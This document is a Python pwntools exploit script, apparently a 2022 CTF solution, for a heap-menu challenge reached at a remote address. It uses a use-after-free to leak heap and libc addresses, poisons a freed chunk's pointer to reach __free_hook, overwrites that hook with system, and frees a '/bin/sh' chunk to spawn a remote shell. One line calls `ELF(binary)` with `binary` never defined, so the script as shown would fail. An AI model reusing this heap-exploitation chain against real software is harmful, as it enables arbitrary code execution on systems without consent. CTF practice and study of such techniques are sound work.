# -*- coding: utf-8 -*-

#########################################################################
# File Name: exp.py
# Created on : 2022-02-12 07:36:37
# Author: r1mit
# Last Modified: 2022-02-15 15:24:25
# Description:
#########################################################################
from pwn import *

#  context.log_level = "debug"
p = remote("35.246.134.224", 30532)
context.terminal = ['tmux', 'splitw', '-h']
#p = process ("./vuln")
#  p = process("./bin",env={"LD_PRELOAD" : "./libc.so.6"})
# patchelf --set-interpreter /home/r1mit/work/ctf/D-CTF2022/cache/ld-2.27.so vuln
elf = ELF(binary)
libc = ELF("./libc.so.6")
def new_admin():
    p.recvuntil("Choice: ")
    p.sendline("1")

def new_user(data):
    p.recvuntil("Choice: ")
    p.sendline("2")
    p.recvuntil("your name: ")
    p.send(data)
def print_admin():
    p.recvuntil("Choice: ")
    p.sendline("3")
def edit_user(data):
    p.recvuntil("Choice: ")
    p.sendline("4")
    p.recvuntil("your name: ")
    p.send(data)
def print_user():
    p.recvuntil("Choice: ")
    p.sendline("5")
def del_admin():
    p.recvuntil("Choice: ")
    p.sendline("6")
def del_user():
    p.recvuntil("Choice: ")
    p.sendline("7")

def main():
    p.sendline("0")
    p.recvuntil("bad input\n")
    # step 1 leak heap
    new_admin()
    new_user('b\n')
    del_admin()
    del_user()
    print_user()
    p.recvuntil(" is ")
    leak_heap_addr = u64(p.recvuntil("\n")[:-1].ljust(8, "\x00"))
    print("leak heap addr: "+hex(leak_heap_addr))
    # step 2 build a fake large chunk with size 0x430
    for i in range(0,36):
        new_user(p64(0x431)*2)
    
    # step 3 malloc out the fake large chunk, and free it to the unsorted bin.
    del_admin()
    del_user()
    edit_user(p64(leak_heap_addr+0x10)+p64(0))
    new_user("aaa\n")
    new_user("aaa\n")
    del_user()
    # step 4 leak the libc address
    print_user()
    p.recvuntil(" is ")
    leak_libc_addr = u64(p.recvuntil("\n")[:-1].ljust(8, "\x00"))
    print("leak libc addr: "+hex(leak_libc_addr))
    libc_base = leak_libc_addr - 0x3ebca0
    print("libc base addr: "+hex(libc_base))
    free_hook_addr = libc.symbols['__free_hook'] + libc_base
    system_addr = libc.symbols['system'] + libc_base
   
    ## step 5 malloc out the __free_hook, and overwrite with the system address
    new_user('a\n')
    new_user('a\n')
    new_user('a\n')
    del_user()
    del_user()
    del_user()
    edit_user(p64(free_hook_addr)*2)
    new_user('a\n')
    new_user(p64(system_addr)+'\n')
    ## step 6 free the binsh heap, get the shell.
    new_user("/bin/sh\x00\n")
    del_user()
    p.interactive()

if __name__ == "__main__":
    main()

